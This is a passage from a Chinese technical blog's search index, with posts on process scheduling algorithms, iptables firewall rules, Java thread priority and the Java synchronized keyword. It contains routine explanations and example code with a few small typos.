先来先服务调度算法最大的缺点就是它不适合处理I/O密集型（I/O-bound）的任务。因为当一个进程因为执行I/O操作而被阻塞后，当I/O操作完成时，这个进程会被放到就绪队列的末端。只有当它前面的进程都被执行完成后，它才能被执行。因此，进程的等待时间会相对较长。而且，当这个进程的I/O操作很频繁时，进程的等待时间就会成倍数形式增加。 总结来收缩，该调度算法适用于包含大量CPU密集型（CPU-bound）的作业的场景，而不适用于包含大量I/O密集型（I/O-bound）的作业的场景。因此，由于在非科学计算使用的现代操作系统中，往往包含频繁的I/O操作，因此先来先服务调度算法并不非常适用。 优点：有利于长作业以及CPU密集型的作业 缺点：不利于短作业以及I/O密集型的作业 最短作业优先调度算法（Shortest job first）最短作业优先调度算法（Shortest job first）是另一个非抢占式（nonpreemptive）调度算法。 在最短作业优先调度算法中，我们假定进程的运行时间（run time）是已知的。而事实上，一个任务的运行时间也是很容易预测的。比如，在保险公司每天后台的批处理服务中，每个索赔任务（claim）的处理时间是几乎一致的，因此根据需要处理的数量可以计算出运行时间。 我们来看一个例子，当前有4个任务 A、B、C和D，它们的运行时间（run time）分别为8、4、4和4分钟。 若以默认的顺序运行（如上图中 a 所示），则A、B、C和D任务的周转时间（turnaround time）分别为8分钟、12分钟、16分钟和20分钟，其中平均周转时间为14分钟。 若采用最短作业优先调度算法（如上图中 b 所示），则周转时间分别为4、8、12和20分钟，其中平均周转时间为11分钟。 显然，最短作业优先调度算法更优。 说明值得一提的是，只有当所有任务的到来时间（arrival time）都相同时，最短作业优先调度算法才是最优解。 最短执行剩余时间优先调度算法（Shortest remaining time next）最短执行剩余时间优先调度算法（Shortest remaining time next）可以看做是最短作业优先调度算法（Shortest job first）的抢占式版本。 在最短执行剩余时间优先调度算法中，当一个新任务到来时，调度器会将这个新任务执行所需要的执行时间和当前正在执行的任务所需要的剩余执行时间进行比较，如果前者小于后者，则发生抢占，即当前正在执行的任务被挂起（susspended），而新任务开始执行。 与最短作业优先调度算法类似，最短执行剩余时间优先调度算法也需要提前知道运行时间（run time）。 交互系统（interactive systems）中的调度算法 在早期操作系统的调度方式大多数是非抢占式的，这是由于早期的应用一般是科学计算或事务处理，不太把人机交互的响应时间指标放在首要位置。 在这种情况下，正在运行的进程可一直占用CPU直到进程阻塞或终止，这种方式对应的调度算法实现简单。 随着计算机的应用领域进一步扩展，计算机更多地用在了多媒体等人机交互应用上。 为此，采用可抢占式（preemptive）的调度方式可在一个进程终止或阻塞之前就剥夺其执行权，并把CPU尽快分配给另外的“更重要”进程，使得就绪队列中的进程有机会响应它们用户的I/O事件，最终获得较短的整体响应时间。 时间片轮转调度算法 (Round-robin scheduling)时间片轮转调度算法 (Round-robin scheduling) 是最古老、简单、公平也最为被广泛使用的调度算法。 在时间片轮转调度算法中，系统将所有就绪进程按FIFO规则排队（称为就绪队列），按一定的时间间隔（time interval）把CPU分配给队列中的进程。这样，就绪队列中所有进程均可获得一个CPU时间片而运行。 时间片轮转调度算法是抢占式的。当一个进程执行到CPU时间片末端而仍没有执行完成时，它会被放到就绪就绪队列的末端，并且接着执行下一个进程。在下图的例子中，进程B就执行到CPU时间片末端但仍没有执行完成，因此被放到就绪就绪队列的末端；并且，F进程会被开始执行 说明一个潜在的问题是如何设置时间片轮转调度算法的CPU时间片长度。 由于进行进程上下文切换（context switch）需要一定的时间，这其中包括保存、加载寄存器（register）和内存映射（memory maps）等等。 若设置较短的CPU时间片长度，会导致频繁的进程上下文切换，因而降低CPU的效率；而设置较长的CPU时间片长度，会对短交互式的请求提供较慢的响应。 在实践中，20到50毫秒通常是一个合理的取值。 基于优先级调度算法 （Priority Scheduling）时间片轮转调度算法假定所有进程都是完全同等重要的。而事实上，不同进程应该有优先级。比如，一个处于后台运行的邮件发送进程相较于一个实时显示视频的进程，应该被设置更低的优先级。 采取基于优先级调度算法要考虑进程饿死（starving）的问题，因为高优先级的进程总是会被优先调度，具有低优先级的进程可能永远都不会被内核调度执行。 为了防止高优先级的进程无限地运行，调度器可以在每隔一定的时钟周期（clock tick）降低正在运行的进程的优先级。当这个进程的优先级低于第二高优先级的进程时，上下文切换发生。或者，可以设置一个最大CPU时间片值，当一个进程的这个最大CPU时间片被用尽时，就轮到了优先级次之的进程运行。 作为一个改进方案，结合时间片轮转调度算法，我们可以根据进程的优先级（priority）进行分组（同优先级的进程归为一组），每一组按照时间片轮转调度算法进行执行。当高优先级的进程队列为空时，次级优先级的进程队列才开始被执行。 这样做的一个不足在于，当高优先级的进程队列一直不为空时，下层的优先级的进程就一直没有机会被执行。 多级队列调度算法（Multilevel queue scheduling） 为了解决”因设置较短的CPU时间片长度，会导致频繁的进程上下文切换，因而降低CPU的效率；而设置较长的CPU时间片长度，会对短交互式的请求提供较慢的响应“的问题， 在多级队列调度算法，位于最高级进程队列的进程被分配一个CPU时间片，位于次最高级进程队列的进程被分配两个CPU时间片，而位于再次级进程队列的进程被分配四个CPU时间片。 当一个进程用完其CPU时间片而未执行完成时，将它放到下一级进程队列中。 比如，一个进程需要100个CPU时间片才能完成。最初，它使用了1个CPU时间片（此时位于最高级的进程队列），之后这个被移到次一级的进程队列，并且发生上下文切换，以让其他进程进行执行。当再次执行到这个进程时，它被提供2个CPU时间片，完成执行后又被移到再次一级的进程队列。在后续的执行中，这个进程会分别获得4、8、16、32、64个CPU时间片。在最后一次执行时，这个进程实际上只会占用37个CPU时间片（而不需要所有的被需要的64个），就完成了。 在上面这个过程中，总共发生了7次上下文切换（包括第一次运行实的加载），而如果采用朴素的时间片轮转调度算法，则需要进行100次上下文切换。 Shortest Process NextGuaranteed SchedulingLottery SchedulingFair-Share Scheduling实时系统（real-time systems）中的调度算法在典型的实时系统（real-time systems）中，一个或多个外部物理设备产生刺激，计算机必须在指定的时间内完成对其的响应。 比如，CD机读取CD盘片上的位信息并发送给计算机，计算机必须在一定的时间内读取这个信息并转换为音乐进行播放。如果这个转换时间太长，这个音乐的播放就会是听起来变调的。 实时系统通常又被分别硬实时（hard real-time）或者软实时（soft real-time）： 硬实时意味着包含绝对的截止时间（deadline），错过这个截止时间会导致严重的错误； 软实时意味着偶然错过截止时间虽然是不被期望的，但是仍然可以被忍受。 进程切换（Process Switch）为了控制进程的执行，内核必须提供挂起（suspend）一个正在运行的进程并且恢复一个之前被挂起的进程的能力，这个过程也称为进程切换（Process Switch）。 在这个过程中，虽然每一个进程拥有独立的内存地址空间（address space），所有的进程不得不共享CPU的寄存器（registers）。因此，在恢复一个进程的执行时，内核必须将所有被这个进程用到的寄存器都恢复成这进程之前被挂起前的状态，这个过程称为硬件上下文（hardware context）。 硬件上下文是进程上下文（Process context）的子集。在Linux中，一部分硬件上下文被存储在进程描述符（process descriptor）中，而另一部分被保存在内核态栈中（Kernel Mode stack）。 从一个进程的运行转到另一个进程上运行，这个过程中经过下面这些变化： 保存当前进程状态至一个进程控制块（PCB, process control blocks），包括程序计数器（program counter）和其他被操作系统用于当前进程以保存数据的寄存器（registers），程序计数器也是一种寄存器。 把进程的PCB移入相应的队列，如就绪队列、阻塞队列中。 选择另一个进程执行，获取其PCB并恢复到内存和CPU缓存中。 执行该新进程。 线程调度（Thread scheduling）Reference 《Modern Operating System 4th》 《UnderStanding The Linux Kernel 3rd Edition》 【原理】 进程调度算法 - https://blog.csdn.net/m0_37925202/article/details/79471445 进程调度的算法及思想 - https://www.jianshu.com/p/f7a1caa481ed Wikipedia Scheduling (computing) - https://en.wikipedia.org/wiki/Scheduling_(computing)","comments":true,"categories":[{"name":"OperatingSystem","slug":"OperatingSystem","permalink":"http://swsmile.info/categories/OperatingSystem/"}],"tags":[{"name":"Operating Systems","slug":"Operating-Systems","permalink":"http://swsmile.info/tags/Operating-Systems/"}]},{"title":"【Linux】iptables防火墙","date":"2019-02-02T09:05:53.000Z","path":"2019/02/02/【Linux】iptables防火墙/","text":"iptables原理iptables是什么iptables是Linux内核默认的防火墙。防火墙，其实说白了讲，就是用于实现Linux下访问控制的功能的，它分为硬件的或者软件的防火墙两种。无论是在哪个网络中，防火墙工作的地方一定是在网络的边缘。而我们的任务就是需要去定义到底防火墙如何工作，这就是防火墙的策略，规则，以达到让它对出入网络的IP、数据进行检测。 对于TCP/IP的七层模型来讲，我们知道第三层是网络层，三层的防火墙会在这层对源地址和目标地址进行检测。 iptables的前身叫ipfirewall （内核1.x时代）,这是一个作者从freeBSD上移植过来的，能够工作在内核当中的，对数据包进行检测的一款简易访问控制工具。但是ipfirewall工作功能极其有限。当内核发展到2.x系列的时候，软件更名为ipchains，它可以定义多条规则，将他们串起来，共同发挥作用，而现在，它叫做iptables，可以将规则组成一个列表，实现绝对详细的访问控制功能。 对于TCP/IP的七层模型来讲，我们知道第三层是网络层，三层的防火墙会在这层对源地址和目标地址进行检测。 iptables的前身叫ipfirewall （内核1.x时代），这是一个作者从freeBSD上移植过来的，能够工作在内核当中的，对数据包进行检测的一款简易访问控制工具。但是ipfirewall工作功能极其有限。当内核发展到2.x系列的时候，软件更名为ipchains，它可以定义多条规则，将他们串起来，共同发挥作用，而现在，它叫做iptables，可以将规则组成一个列表，实现绝对详细的访问控制功能。 规则（rules）规则是iptables对数据包进行操作的基本单元。即“当数据包符合规则定义的条件时，就按照规则中定义的动作去处理”。 规则中定义的条件一般包括源地址/端口、目的地址/端口、传输协议（TCP/UDP/ICMP）等。 而规则定义的动作一般有： ACCEPT：允许数据包通过； DROP： 直接丢弃数据包，不给任何回应信息； REJECT：拒绝数据包通过，必要时会给数据发送端一个响应的信息。 配置iptables实际上就是增删修改这些规则。 链（chains）链是数据包传播的路径，每条链中都有若干个规则。 当一个数据包到达一条链时，iptables会按照规则的顺序，从该链的第一条规则开始往下检查，如果有条件匹配的规则，则按照规则定义的动作执行；否则继续检查下一条规则。如果该数据包和链中所有的规则都不匹配，则iptables会根据该链预先定义的默认策略来处理数据包。 表（tables）iptables内置了4个表，即 filter表、nat 表、mangle 表、raw 表，分别用于实现包过滤、网络地址转换、包修改和数据跟踪处理等功能。 每个表中含有若干条链，具体的规则就是根据实现目的的不同，添加到不同表的不同链中。 如下图所示，各个表分别包含相关的链： raw表有2条链：PREROUTING链、OUTPUT链； mangle表有5条链：PREROUTING链、POSTROUTING链、INPUT链、OUTPUT链、FORWARD链； nat表有3条链：PREROUTING链、POSTROUTING链、OUTPUT链 filter表有3条链：INPUT链、FORWARD链、OUTPUT链 4个表的优先级为：raw &gt; mangle &gt; nat &gt; filter。 raw表中包含PREROUTING链和OUTPUT链，优先级最高。因此，可以对数据包在进入NAT表的PREROUTING链之前对消息进行处理。 数据流 分析当数据包到达网卡时，首先会进入PREROUTING链（注意，PREROUTING链中存在不同表中的规则，这些规则存在优先顺序），完成PREROUTING链中规则的匹配和执行后，iptables会根据数据包的目的IP是否为本机地址，判断是否需要将该数据包转发出去。若为本机，则进入OUTPUT链，否则直接进入POSTROUTING链。最终输出。 综上，数据包在iptables中的传输链路有两种情况： 第一种：PREROUTING -&gt; FORWARD -&gt; POSTROUTING 第二种：PREROUTING -&gt; INPUT -&gt; LOCALHOST -&gt; OUTPUT -&gt; PUSTROUTING 所以，要想对数据包进行控制，主要可以在上面几条链路中添加规则。 iptables使用防火墙的开关CentOS7CentOS从7开始，使用systemctl来管理服务和程序，包括了service和chkconfig。 123456#打开$ systemctl start firewalld.service#关闭$ systemctl stop firewalld.service#重启$ systemctl restart firewalld.service Openwrt123456#打开$ service firewall start#关闭$ service firewall stop#重启$ service firewall restart 列出规则 -Liptables对规则的操作方法有： 列出指定chain中的规则 123$ iptables --list [chain [rulenum]]# 或者$ iptables -L [chain [rulenum]] 列出指定table中的规则 1$ iptables -L [-t tables] [-nv] -t：指定table名，例如nat或filter，若省略，则使用默认的filter -L：列出所有规则 -n：不进行IP与HOSTNAME的反查，显示信息速度回快很多。 -v：列出更多的信息，包括通过该规则的数据包总位数、相关的网络接口等 -L用于显示所有规则，比如查看nat表中的所有规则： 1$ iptables -t nat -L -n target：代表进行的操作，ACCEPT是放行，而REJECT则是拒绝，此外，还有DROP表示丢弃。 prot：代表使用的数据包协议，主要有TCP、UDP以及ICMP3种数据包格式。 opt：额外选项说明。 source：代表此规则是针对哪个来源IP进行限制。 destination：代表此规则是针对哪个目标进行限制。 清除规则 -F1$ iptables [-t tables] [-FXZ] 选项与参数： -F：清除所有规则 -X：清除所有用户“自定义”的chain -Z：将所有chain的计数与流量统计都归零 比如： 1234# 清除所有的规则$ iptables -F# 清除nat表的规则$ iptables -F -t nat 增加规则 -A以下命令用于增加一条规则到特定的chain中： 123$ iptables --append [chain]# 或者$ iptables -A [chain] 常用的用于描述规则细节的参数有： -s, –src, –source：匹配的源地址 -d, –dst, –destination：匹配的目的地址 –sport, –source-port：匹配的源端口 –dport, –destination-port：匹配的目的端口 -p, –protocol：匹配的协议，比如 tcp、udp 等 -i, –in-interface：匹配输入的网卡，用来描述匹配要匹配该规则，该包是从哪块网卡进入，可以使用通配字符 + 来做大范围匹配 -o, –out-interface：匹配输出的网卡 !：取反 -m state —state：用来匹配连接状态， 连接状态共有四种：INVALID、ESTABLISHED、NEW 和 RELATED。 INVALID 表示该封包的连接编号（Session ID）无法辨识或编号不正确。 ESTABLISHED 表示该封包属于某个已经建立的连接。 NEW 表示该封包想要起始一个连接（重设连接或将连接重导向）。 RELATED 表示该封包是属于某个已经建立的连接，所建立的新连接。例如：FTP-DATA 连接必定是源自某个 FTP 连接。 -j：对该规则执行的动作，包括ACCEPT（接受）、REJECT（拒绝）、DROP（丢弃）和 REDIRECT（重定向）等。 ACCEPT： 将封包放行，进行完此处理动作后，将不再匹配其它规则，直接跳往下一个规则链（natostrouting）。 REJECT： 拦阻该封包，并传送封包通知对方，可以传送的封包有几个选择：ICMP port-unreachable、ICMP echo-reply 或是tcp-reset（这个封包会要求对方关闭 连接），进行完此处理动作后，将不再匹配其它规则，直接中断过滤程序。 范例如下：iptables -A FORWARD -p TCP –dport 22 -j REJECT –reject-with tcp-reset DROP： 丢弃封包不予处理，进行完此处理动作后，将不再匹配其它规则，直接中断过滤程序。 REDIRECT： 将封包重新导向到另一个端口（PNAT），进行完此处理动作后，将会继续匹配其它规则。 这个功能可以用来实现透明代理或用来保护 web 服务器。例如：iptables -t nat -A PREROUTING -p tcp –dport 80 -j REDIRECT –to-ports 8080 –tcp-flags： 比如， 1234$ iptables -A INPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT #允许本地回环接口(即运行本机访问本机)$ iptables -A OUTPUT -j ACCEPT #允许所有本机向外的访问$ iptables -A INPUT -p tcp --dport 22 -j ACCEPT #允许访问22端口$ iptables -A INPUT -j reject #禁止其他未允许的规则访问 屏蔽IP 1234$ iptables -I INPUT -s 123.45.6.7 -j DROP #屏蔽特定IP发来的数据包$ iptables -I INPUT -s 123.0.0.0/8 -j DROP #封整个段即从123.0.0.1到123.255.255.254的命令$ iptables -I INPUT -s 124.45.0.0/16 -j DROP #封IP段即从123.45.0.1到123.45.255.254的命令$ iptables -I INPUT -s 123.45.6.0/24 -j DROP #封IP段即从123.45.6.1到123.45.6.254的命令是 拒绝转发来自192.168.1.10主机的数据，允许转发来自192.168.0.0/24网段的数据： 12$ iptables -A FORWARD -s 192.168.1.11 -j REJECT$ iptables -A FORWARD -s 192.168.0.0/24 -j ACCEPT 拒绝进入防火墙的所有ICMP协议数据包： 1$ iptables -I INPUT -p icmp -j REJECT 允许防火墙转发除ICMP协议以外的所有数据包： 1$ iptables -A FORWARD -p ! icmp -j ACCEPT 说明：使用“！”可以将条件取反。 在filter表的INPUT链中追加一条规则，规则的匹配条件是数据包的源IP为192.168.1.10，执行动作为允许（ACCEPT），即允许源IP为192.168.1.10的消息访问本机： 1$ iptables -t filter -A INPUT -s 192.168.1.10 -j ACCEPT 允许指定IP地址访问公网： 1$ iptables -A FORWARD -s 192.168.1.92/24 -j ACCEPT 允许访问指定的IP地址： 1$ iptables -A FORWARD -d 192.168.1.92 -j ACCEPT 定义新的规则链 -N以下命令用于定义一个新的chain： 1$ iptables -N [chain] Reference Linux防火墙–iptables学习 - https://www.jianshu.com/p/5f38e7253fc8 iptables详解及一些常用规则 - https://www.jianshu.com/p/ee4ee15d3658 iptables - Unix, Linux Command - http://www.tutorialspoint.com/unix_commands/iptables.htm iptables规则的查看和清除 - https://cakin24.iteye.com/blog/2339362 iptables命令 - http://man.linuxde.net/iptables","comments":true,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/tags/Linux/"}]},{"title":"【Java】多线程-线程优先级","date":"2019-02-01T08:23:50.000Z","path":"2019/02/01/【Java】多线程-线程优先级/","text":"线程优先级的设置优先级取值范围Java 线程优先级使用 1 ~ 10 的整数表示： 最低优先级 1：Thread.MIN_PRIORITY 最高优先级 10：Thread.MAX_PRIORITY 普通优先级 5：Thread.NORM_PRIORITY 获取线程优先级123public static void main(String[] args) &#123; System.out.println(Thread.currentThread().getPriority(); // 5&#125; 设置优先级Java 使用 setPriority 方法设置线程优先级，方法签名 1public final void setPriority(int newPriority) 示例： 1234567891011public static void main(String[] args) &#123; Thread.currentThread().setPriority(Thread.MIN_PRIORITY); // 1 System.out.println(Thread.currentThread().getPriority()); Thread.currentThread().setPriority(Thread.MAX_PRIORITY); // 10 System.out.println(Thread.currentThread().getPriority()); Thread.currentThread().setPriority(8); // 8 System.out.println(Thread.currentThread().getPriority()); &#125; 默认线程优先级Java 默认的线程优先级是父线程的优先级，而非普通优先级Thread.NORM_PRIORITY。只是因为主线程默认优先级是普通优先级Thread.NORM_PRIORITY，所以如果没有显式地设置线程优先级时，新创建的线程的优先级就是普通优先级Thread.NORM_PRIORITY。 线程调度高优先级的线程比低优先级的线程有更高的几率得到执行（得到CPU时间片）。之所以说有“有更高的几率”，是因为当存在一个高优先级的线程时，低优先级的线程在高优先级的线程执行完成前，仍然有可能获得CPU时间片（而不是当一个高优先级的线程存在之后，高优先级的线程立刻抢占低优先级的线程的CPU时间片，直到这个高优先级的线程执行完成后，低优先级的线程才能继续执行）。 比如： 123456789101112131415161718192021class Main extends Thread &#123; public Main(String name) &#123; super(name); &#125; @Override public void run() &#123; for (int i = 0; i &lt; 10; i++) &#123; System.out.println(Thread.currentThread().getName() + \" : \" + i); &#125; &#125; public static void main(String[] args) &#123; Thread t1 = new Main(\"A\"); Thread t2 = new Main(\"B\"); t1.setPriority(Thread.MIN_PRIORITY); t2.setPriority(Thread.MAX_PRIORITY); t1.start(); t2.start(); &#125;&#125; 执行结果1234567891011121314151617181920A : 0A : 1B : 0B : 1B : 2B : 3A : 2B : 4B : 5B : 6A : 3A : 4A : 5A : 6A : 7A : 8A : 9B : 7B : 8B : 9 而这个程序的执行结果不是稳定复现的（即每次执行得到的打印结果都不相同）。 Reference Java 多线程：线程优先级 - https://blog.csdn.net/Silent_Paladin/article/details/54561496","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】Java关键字 - synchronized关键字","date":"2019-01-31T10:51:29.000Z","path":"2019/01/31/【Java】Java关键字-synchronized关键字/","text":"为什么要引入同步机制在多线程环境中，可能会有两个甚至更多的线程试图同时访问一个有限的资源。必须对这种潜在资源冲突进行预防。 用一个取钱的程序例子，来说明为什么需要引入同步： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152public class Main &#123; public static void main(String[] args) &#123; Bank bank = new Bank(); Thread t1 = new MoneyThread(bank);// 从银行取钱线程 Thread t2 = new MoneyThread(bank);// 从取款机取钱线程 t1.start(); t2.start(); &#125;&#125;class Bank &#123; private int money = 1000; public int depositMoney(int amount) &#123; if (amount &lt; 0) &#123; return -1; &#125; else if (amount &gt; money) &#123; return -2; &#125; else if (money &lt; 0) &#123; return -3; &#125; else &#123; try &#123; Thread.sleep(1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; money -= amount; System.out.println(\"Left Money: \" + money); return amount; &#125; &#125;&#125;class MoneyThread extends Thread &#123; private Bank bank; public MoneyThread(Bank bank) &#123; this.bank = bank; &#125; @Override public void run() &#123; int result = bank.depositMoney(800); if(result == -1 || result == -2 || result == -3) System.out.println(\"Deposit fails\"); else System.out.println(\"Depositing \" + result + \" succeeds\"); &#125;&#125; 执行结果1234Left Money: 200Deposit 800 successfullyLeft Money: 200Deposit 800 successfully 分析程序中定义了一个Bank类，其中包含了用户存储的钱（1000元），然后用两个线程进行取钱操作，可以看到尽管Bank类中的getMoney()方法对取钱数目与存款数据进行了判断，但是执行后，结果输出两个800，表明从两个线程中都成功地取出了800元钱。此后银行中的钱金额为-600。 这是因为，在depositMoney()方法中，当进入最后一个else语句块后，有一个简短的休眠，那么在第一个线程休眠的过程中，第二个线程也成功进入了这个else语句块（因为存款的钱还没有被线程一取走）。当两个线程结束休眠后，不再进行逻辑判断而是直接将钱取走，所以两个线程都取到了800元钱，此后money为-600。 由于我们设置了线程的休眠时长为1s（时长较长），因此很有可能两个线程都已经成功进入else语句块。 若我们缩小休眠时长（比如5ms），当一个线程率先执行到了else块时，另一个线程是否执行到了else块是未知的，且执行到了else快的哪一行代码（由 JVM 对线程的调度决定）。因此，可能会出现以下的任何一种输出情况： 1234Left Money: -600Left Money: -600Deposit 800 successfullyDeposit 800 successfully 或 fails123Deposit failsLeft Money: 200Depositing 800 succeeds 或 1234Left Money: 200Left Money: 200Depositing 800 succeedsDepositing 800 succeeds 或 1234Left Money: 200Depositing 800 succeedsLeft Money: -600Depositing 800 succeeds 解决办法显然这样的取款机制很不可靠的，我们必须要通过引入同步机制。以保证程序的执行是如我们预期的。 因此，在多线程访问资源的情况时，我们为访问资源的第一个线程上锁，此后其他线程便不能再使用那个资源，除非该锁被解除。 换句话说，如果两个线程同时操作对象中的实例变量，则会出现“非线程安全”问题。 Java的synchronized关键字为我们提供了一套锁机制，以解决非线程安全问题，我们来看看使用了synchronized上面的程序有什么变化： 注意，以下程序与上面的实现唯一的区别在于我们使用synchronized关键字修饰了 getMoney(int number)方法。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051public class Main &#123; public static void main(String[] args) &#123; Bank bank = new Bank(); Thread t1 = new MoneyThread(bank);// 从银行取钱线程 Thread t2 = new MoneyThread(bank);// 从取款机取钱线程 t1.start(); t2.start(); &#125;&#125;class Bank &#123; private int money = 1000; public synchronized int depositMoney(int amount) &#123; if (amount &lt; 0) &#123; return -1; &#125; else if (amount &gt; money) &#123; return -2; &#125; else if (money &lt; 0) &#123; return -3; &#125; else &#123; try &#123; Thread.sleep(1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; money -= amount; System.out.println(\"Left Money: \" + money); return amount; &#125; &#125;&#125;class MoneyThread extends Thread &#123; private Bank bank; public MoneyThread(Bank bank) &#123; this.bank = bank; &#125; @Override public void run() &#123; int result = bank.depositMoney(800); if(result == -1 || result == -2 || result == -3) System.out.println(\"Deposit fails\"); else System.out.println(\"Depositing \" + result + \" succeeds\"); &#125;&#125; 执行结果稳定地输出： 123Left Money: 200Depositing 800 succeedsDeposit fails 分析这表明第一次取款800元后，剩余200元。当另一个线程再去取的时候，已经不能再取钱了。 一个线程开始执行取钱的方法之后就阻止了其他线程再去执行这个方法，直到本线程结束，其他线程才有访问权利。 synchronized关键字含义多线程的同步机制对资源进行加锁，使得在同一个时间，只有一个线程可以进行操作，同步用以解决多个线程同时访问时可能出现的问题。 同步机制可以使用synchronized关键字实现。 根据synchronized用的位置可以有这些使用场景： ![image-20190201121634389](assets/image-20190201121634389.png synchronized关键字在需要原子性、可见性和有序性这三种特性的时候都可以作为其中一种解决方案，看起来是“万能”的。的确，大部分并发控制操作都能使用synchronized来完成。 synchronized修饰方法 - 同步方法当synchronized关键字修饰一个方法的时候，该方法叫做同步方法。这个方法是一个原子操作，即若多个线程都去执行这个方法时，从其中的一个线程开始执行这个方法，到执行完成的过程中，其他线程都必须进行等待。 当synchronized方法执行完或发生异常时，会自动释放锁。 例子1 - 是否使用synchronized关键字的不同1234567891011121314151617181920212223242526272829303132333435363738394041public class Main &#123; public static void main(String[] args) &#123; Example example = new Example(); Thread t1 = new Thread1(example); Thread t2 = new Thread1(example); t1.start(); t2.start(); &#125;&#125;class Example &#123; public void execute() &#123; for (int i = 0; i &lt; 5; ++i) &#123; try &#123; Thread.sleep(500); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.println(\"Hello: \" + i); &#125; &#125;&#125;class Thread1 extends Thread&#123; private Example example; public Thread1(Example example) &#123; this.example = example; &#125; @Override public void run() &#123; example.execute(); &#125;&#125; 执行结果12345678910Hello: 0Hello: 1Hello: 2Hello: 3Hello: 4Hello: 0Hello: 1Hello: 2Hello: 3Hello: 4 总结是否在execute()方法前加上synchronized关键字，这个例子程序的执行结果会有很大的不同。 如果不加synchronized关键字，则两个线程同时并行地执行execute()方法，输出是两组并发的。 如果加上synchronized关键字，则会先输出一组0到4，然后再输出下一组0到4，说明两个线程是顺次执行的。 例子2 - 同一个类中包含多个同步方法代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980public class Main &#123; public static void main(String[] args) &#123; Example example = new Example(); Thread t1 = new Thread1(example); Thread t2 = new Thread2(example); t1.start(); t2.start(); &#125; &#125; class Example &#123; public synchronized void execute() &#123; for (int i = 0; i &lt; 5; ++i) &#123; try &#123; Thread.sleep((long) Math.random() * 1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.println(\"Hello: \" + i); &#125; &#125; public synchronized void execute2() &#123; for (int i = 0; i &lt; 5; ++i) &#123; try &#123; Thread.sleep((long) Math.random() * 1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.println(\"World: \" + i); &#125; &#125; &#125; class Thread1 extends Thread &#123; private Example example; public Thread1(Example example) &#123; this.example = example; &#125; @Override public void run() &#123; example.execute(); &#125; &#125; class Thread2 extends Thread &#123; private Example example; public Thread2(Example example) &#123; this.example = example; &#125; @Override public void run() &#123; example.execute2(); &#125; &#125; 执行结果12345678910Hello: 0Hello: 1Hello: 2Hello: 3Hello: 4World: 0World: 1World: 2World: 3World: 4 说明如果一个对象有多个synchronized方法，某一时刻某个线程已经进入到了这个对象的某个synchronized方法，那么在该方法没有执行完毕前，其他线程是无法访问该对象的任何synchronized方法的。 Java中的每个对象都有一个锁（lock），或者叫做监视器（monitor），当一个线程访问某个对象的synchronized方法时，将该对象上锁，其他任何线程都无法再去访问该对象的synchronized方法了（这里是指所有的同步方法，而不仅仅是同一个方法），直到之前的那个线程执行方法完毕后（或者是抛出了异常），才将该对象的锁释放掉，其他线程才有可能再去访问该对象的synchronized方法。 注意这时候是给对象上锁，如果是不同的对象，则各个对象之间没有限制关系。即若尝试在代码中构造第二个线程对象时传入一个新的 Example 对象，则两个线程的执行之间任何什么制约关系。 例子3 - 静态的同步方法当一个synchronized关键字修饰的方法同时又被static修饰，之前说过，非静态的同步方法会将对象上锁，但是静态方法不属于对象，而是属于类，它会将这个方法所在的类的Class对象上锁。 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566import java.util.List;public class Main &#123; public static void main(String[] args) &#123; Example example = new Example(); Thread t1 = new Thread1(example); // 此处即便传入不同的对象，静态方法同步仍然不允许多个线程同时执行 example = new Example(); Thread t2 = new Thread2(example); t1.start(); t2.start(); &#125;&#125;class Example &#123; public synchronized static void execute() &#123; for (int i = 0; i &lt; 5; ++i) &#123; try &#123; Thread.sleep((long) Math.random() * 1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.println(\"Hello: \" + i); &#125; &#125; public synchronized static void execute2() &#123; for (int i = 0; i &lt; 5; ++i) &#123; try &#123; Thread.sleep((long) Math.random() * 1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.println(\"World: \" + i); &#125; &#125;&#125;class Thread1 extends Thread &#123; private Example example; public Thread1(Example example) &#123; this.example = example; &#125; @Override public void run() &#123; Example.execute(); &#125;&#125;class Thread2 extends Thread &#123; private Example example; public Thread2(Example example) &#123; this.example = example; &#125; @Override public void run() &#123; Example.execute2(); &#125;&#125; 运行结果12345678910Hello: 0Hello: 1Hello: 2Hello: 3Hello: 4World: 0World: 1World: 2World: 3World: 4 分析所以如果是静态方法的情况（execute()和execute2()都加上static关键字），即便是向两个线程传入不同的 Example 对象，这两个线程仍然是互相制约的，必须先执行完一个，再执行下一个。 如果某个synchronized方法是static的，那么当线程访问该方法时，它锁的并不是synchronized方法所在的对象，而是synchronized方法所在的类所对应的Class对象。Java中，无论一个类有多少个对象，这些对象会对应唯一一个Class对象，因此当线程分别访问同一个类的两个对象的两个static，synchronized方法时，它们的执行顺序也是顺序的，也就是说一个线程先去执行方法，执行完毕后另一个线程才开始。 synchronized块synchronized块写法： 1234synchronized(object)&#123; &#125; 表示线程在执行的时候会将object对象上锁。（注意这个对象可以是任意类的对象，也可以使用this关键字）。 这样就可以自行规定上锁对象。 例子412345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576public class Main &#123; public static void main(String[] args) &#123; Example example = new Example(); Thread t1 = new Thread1(example); Thread t2 = new Thread2(example); t1.start(); t2.start(); &#125;&#125;class Example &#123; private Object object = new Object(); public void execute() &#123; synchronized (object) &#123; for (int i = 0; i &lt; 5; ++i) &#123; try &#123; Thread.sleep((long) Math.random() * 1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.println(\"Hello: \" + i); &#125; &#125; &#125; public void execute2() &#123; synchronized (object) &#123; for (int i = 0; i &lt; 5; ++i) &#123; try &#123; 